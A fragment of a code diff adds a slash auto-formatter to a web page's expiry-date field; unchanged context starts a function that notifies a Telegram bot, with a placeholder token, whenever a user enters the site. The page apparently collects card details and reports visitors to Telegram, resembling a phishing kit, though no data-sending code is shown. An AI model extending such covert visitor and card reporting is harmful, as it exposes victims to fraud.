@@ -98,6 +98,16 @@
     </div>
 
     <script>
+        // Auto-insert slash in expiry date field
+        const expiryDateField = document.getElementById('expiryDate');
+        expiryDateField.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
         // Function to notify Telegram when the user enters the site
         function notifyUserEntry() {
             const telegramBotToken = 'YOUR_BOT_TOKEN';  // Replace with your Telegram Bot Token
